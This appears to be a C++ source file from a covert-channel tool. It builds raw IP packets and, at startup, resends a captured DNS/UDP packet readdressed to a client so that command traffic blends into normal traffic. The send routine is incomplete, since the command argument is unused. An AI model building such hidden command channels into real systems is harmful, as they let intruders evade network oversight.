//
// Created by bensoer on 31/10/16.
//

#include "CovertSocket.h"
#include "../shared/Logger.h"
#include "SystemState.h"
#include "../shared/Structures.h"

#include <cerrno>
#include <cstring>
#include <dnet.h>
#include <netinet/udp.h>
#include <malloc.h>

CovertSocket::CovertSocket(TrafficAnalyzer * trafficAnalyzer, HCrypto * crypto, string clientIP) {
    this->trafficAnalyzer = trafficAnalyzer;
    this->crypto = crypto;
    this->clientIP = clientIP;

    this->rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
    int arg = 1;
    if (setsockopt (this->rawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1){
        Logger::debug("CovertSocket - SetSockOpt Failed For SO_REUSEADDR. Error: " + string(strerror(errno)));
    }

    //IP_HDRINCL to stop the kernel from building the packet headers
    {
        int one = 1;
        const int *val = &one;
        if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
            Logger::debug("CovertSocket - SetSockOpt Failed For IP_HDRINCL. Error: " + string(strerror(errno)));
        }

    }
}

void CovertSocket::send(string command) {

    PacketMeta meta;
    if(SystemState::currentState == SystemState::STARTUP){
        Logger::debug("CovertSocket:send - STARTUP Mode Detected. Sending Last TrafficAnalyzer Packet To Client");
        //if were in startup we get the last one, otherwise its the best one
        meta = this->trafficAnalyzer->getLastPacketAdded();

        Logger::debug("CovertSocket:send - Parsing Contents For STARTUP Send");
        char * ptr = meta.packet;
        struct iphdr * ip = (struct iphdr *)ptr;
        ip->daddr = inet_addr(this->clientIP.c_str());
        ip->check = 0;
        ip->check = this->csum((unsigned short *) meta.packet, sizeof(iphdr));

        int iphdr_length = (ip->ihl * 4);
        //startup has to be udp since its DNS
        struct udphdr * udp = (struct udphdr *)(ptr + iphdr_length);

        Logger::debug("CovertSocket:Send - Generating sockaddr_in for STARTUP Send");
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = udp->dest;
        sin.sin_addr.s_addr = inet_addr(this->clientIP.c_str());

        udp->check = 0;
        udp->uh_sum = 0;

        Logger::debug("CovertSocket:send - Sending Packet");
        ssize_t result = sendto(this->rawSocket, meta.packet, ntohs(ip->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin));
        if(result < 0){
            Logger::debug("CovertSocket - SendTo Failed. Error: " + string(strerror(errno)));
        }

    }else{
        meta = this->trafficAnalyzer->getBestPacketToSend();
    }

}

/**
 * csum is a helper method that generates the checksum needed for the response packet to be validated and sent
 * by the network stack
 * @param ptr
 * @param nbytes
 * @return
 */
unsigned short CovertSocket::csum (unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }

    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;

    return(answer);
}